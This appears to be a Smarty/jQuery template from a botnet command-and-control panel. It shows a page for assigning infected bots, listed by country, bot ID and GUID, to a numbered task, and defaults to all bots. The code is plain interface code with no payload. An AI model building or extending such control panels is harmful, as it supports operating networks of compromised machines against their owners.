{if isset($TASK)}
<h1>Add bots to task #{$TASK}</h1>
<br>
<a id='lnk_add_bots' href='javascript:void();'>Select favorite bots</a><br><br>
<form id='frm_addbots'>
<table style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 240); width:700px;" border="1" cellpadding="3" cellspacing="0" id='bots_table'>
<th style='width:30px;'>#</th><th style='width:40px;'>Country</th><th style='width:40px;'>BOT ID</th><th>GUID</th><th style='width:20px;'></th>

<tr><td colspan='5' align='center'><b>There are no selected bots! Using all bots!</b></td></tr>
</table>
<input type='hidden' value='{$TASK}' name='task'>
<hr color="#dddddd" size="1">
<center><input type='submit' value='Save'></center>
</form>
{/if}

{literal}
<script>
$('#lnk_add_bots').click(function() { LoadPopup('./mod/get_bots.php?task={/literal}{$TASK}{literal}', 'Add bots to task', 700); });


$("#frm_addbots").submit(function() 
{
	pdata = $('#frm_addbots').serialize(true);
    $.post('./mod/task_addbots.php', pdata, function(data) { $("#page_content").html(data); });
    return false;
});
$('#lnk_add_bots').click();
</script>
{/literal}